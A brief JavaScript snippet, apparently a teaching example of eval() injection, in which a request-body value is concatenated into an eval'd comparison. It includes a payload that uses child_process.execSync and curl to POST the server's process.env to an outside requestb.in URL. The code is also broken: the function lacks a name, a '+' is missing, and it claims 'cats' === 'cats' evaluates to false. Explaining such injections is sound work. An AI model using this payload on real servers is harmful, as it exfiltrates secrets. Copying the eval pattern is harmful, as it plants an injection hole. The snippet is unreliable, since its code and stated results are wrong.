'use strict';

function (req, res) {
  const fromDb = 'cats';
  const compare = req.body.compare;

  if (eval('"' + compare '" === "' + fromDb + '"')) {
    // do x
  }
}

// input = pet
eval('"pet" === "cats"') // false
// input = cats
eval('"cats" === "cats"') // false
// input = ";require("child_process")
//  .execSync(`curl -X POST http://requestb.in/uapxyvua
//   -d \'${JSON.stringify(process.env)}\'`); "
eval('"";require("child_process")\
  .execSync(\
   `curl -X POST http://requestb.in/uapxyvua\
   -d \'${JSON.stringify(process.env)}\'`);\
   ""=== "cats"'); // false
